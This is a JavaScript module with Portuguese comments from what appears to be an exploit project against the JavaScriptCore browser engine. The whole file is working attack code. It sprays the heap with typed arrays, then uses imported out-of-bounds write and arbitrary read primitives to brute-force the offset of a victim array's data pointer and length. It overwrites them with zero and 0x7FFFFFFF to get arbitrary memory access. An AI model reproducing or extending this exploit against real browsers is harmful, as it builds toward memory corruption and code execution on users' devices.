// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO para R46 - Fuzzer de Offset)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_write_absolute,
    arb_read // Vamos precisar do arb_read relativo para restaurar a memória
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_OFFSET_FUZZER_R46 = "Heisenbug_OffsetFuzzer_R46";

// NOVO: A função principal agora é um "fuzzer" que busca o offset correto.
export async function executeOffsetFuzzer_R46() {
    const FNAME_CURRENT_TEST = FNAME_MODULE_OFFSET_FUZZER_R46;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Buscando Offset para Corrupção de TypedArray ---`, "test", FNAME_CURRENT_TEST);
    
    let result = { success: false, msg: "Fuzzer não encontrou um offset válido.", errorOccurred: null };
    let victim_array = null; // Declarado aqui para ser acessível no finally

    try {
        // --- FASE 0: PREPARAÇÃO ---
        logS3(`--- Fase 0 (R46): Preparação do Heap ---`, "subtest", FNAME_CURRENT_TEST);
        let spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push(new Uint32Array(32));
        }
        victim_array = new Uint32Array(32);
        spray = null;
        logS3(`[R46] Heap preparado. Array vítima criado.`, 'info');
        await PAUSE_S3(100);
        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-Setup` });
        
        // --- FASE 1: LOOP DE FUZZING ---
        logS3(`--- Fase 1 (R46): Iniciando Loop de Fuzzing ---`, "subtest", FNAME_CURRENT_TEST);

        const M_VECTOR_OFFSET = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const M_LENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        const FUZZ_START_OFFSET = 0x20;
        const FUZZ_END_OFFSET = 0x400;
        const FUZZ_STEP = 0x4;

        for (let offset_guess = FUZZ_START_OFFSET; offset_guess < FUZZ_END_OFFSET; offset_guess += FUZZ_STEP) {
            logS3(`[Fuzzer] Testando offset_guess = ${toHex(offset_guess)}...`, 'debug');
            
            const vector_write_target = offset_guess + M_VECTOR_OFFSET;
            const length_write_target = offset_guess + M_LENGTH_OFFSET;

            // 1. Salva os valores originais para poder restaurar a memória depois
            const original_vector_low = await arb_read(vector_write_target, 4);
            const original_vector_high = await arb_read(vector_write_target + 4, 4);
            const original_length = await arb_read(length_write_target, 4);
            
            // 2. Tenta a corrupção
            oob_write_absolute(vector_write_target, 0x0, 4);
            oob_write_absolute(vector_write_target + 4, 0x0, 4);
            oob_write_absolute(length_write_target, 0x7FFFFFFF, 4);

            // 3. Auto-teste
            const TEST_ADDRESS = 0x100000;
            const TEST_VALUE = 0xDEADBEEF;
            const test_index = TEST_ADDRESS / 4;
            
            victim_array[test_index] = TEST_VALUE;
            let read_back_value = victim_array[test_index];
            
            // 4. Restaura a memória para a próxima iteração
            oob_write_absolute(vector_write_target, original_vector_low, 4);
            oob_write_absolute(vector_write_target + 4, original_vector_high, 4);
            oob_write_absolute(length_write_target, original_length, 4);
            
            // 5. Verifica o resultado do teste
            if (read_back_value === TEST_VALUE) {
                result.success = true;
                result.msg = `Offset funcional encontrado: ${toHex(offset_guess)}`;
                logS3(`[Fuzzer] SUCESSO! ${result.msg}`, 'vuln');
                break; // Encontrou, sai do loop
            }
        }

        if (!result.success) {
             throw new Error(`Fuzzer completou a faixa de ${toHex(FUZZ_START_OFFSET)} a ${toHex(FUZZ_END_OFFSET)} sem encontrar um offset válido.`);
        }

    } catch (e_outer) {
        result.errorOccurred = e_outer;
        result.msg = e_outer.message;
        logS3(`  CRITICAL ERROR (R46): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
        console.error("Outer error in R46 Fuzzer:", e_outer);
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
    return result;
}
